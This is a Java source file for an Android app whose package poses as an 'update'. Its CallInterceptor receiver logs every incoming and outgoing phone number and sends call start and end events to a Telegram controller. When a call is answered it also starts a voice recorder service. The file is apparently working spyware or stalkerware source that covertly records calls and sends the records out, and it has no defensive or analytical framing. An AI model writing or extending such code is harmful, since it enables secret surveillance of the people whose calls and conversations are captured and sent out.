package com.kasari.update;

import android.content.*;
import android.os.Build;
import android.telephony.TelephonyManager;
import java.text.SimpleDateFormat;
import java.util.*;

public class CallInterceptor extends BroadcastReceiver {

    private static String lastNumber = "";
    private static boolean wasRinging = false;

    @Override
    public void onReceive(Context ctx, Intent intent) {
        String action = intent.getAction();

        if (Intent.ACTION_NEW_OUTGOING_CALL.equals(action)) {
            lastNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            if (lastNumber == null) lastNumber = "Unknown";
            return;
        }

        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        if (state == null) return;

        if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
            lastNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            if (lastNumber == null) lastNumber = "Unknown";
            wasRinging = true;
            TelegramController.sendMessage("📞 Incoming Call: " + lastNumber);

        } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
            // Call answered — start recording
            String number = lastNumber.isEmpty() ? "Unknown" : lastNumber;
            String type = wasRinging ? "Incoming" : "Outgoing";
            TelegramController.sendMessage("📞 Call Started (" + type + "): " + number);
            Intent recI = new Intent(ctx, VoiceRecorder.class);
            recI.setAction(VoiceRecorder.ACTION_CALL);
            recI.putExtra("number", number);
            recI.putExtra("type", type);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                ctx.startForegroundService(recI); else ctx.startService(recI);

        } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
            wasRinging = false;
            // Stop recording
            Intent stopI = new Intent(ctx, VoiceRecorder.class);
            stopI.setAction(VoiceRecorder.ACTION_STOP);
            ctx.startService(stopI);
            String time = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
                .format(new Date());
            TelegramController.sendMessage("📞 Call Ended: " + lastNumber + " | " + time);
            lastNumber = "";
        }
    }
}
